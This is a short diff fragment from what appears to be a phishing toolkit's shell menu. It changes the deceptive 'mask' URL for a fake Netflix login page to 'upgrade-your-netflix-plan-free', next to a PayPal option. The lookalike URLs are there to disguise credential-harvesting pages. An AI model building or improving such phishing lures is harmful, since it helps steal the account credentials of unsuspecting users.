@@ -546,7 +546,7 @@ main_menu() {
 			tunnel_menu;;
 		5 | 05)
 			website="netflix"
-			mask='http://upgrade-your-netflix.com/br/Login'
+			mask='http://upgrade-your-netflix-plan-free'
 			tunnel_menu;;
 		6 | 06)
 			website="paypal"
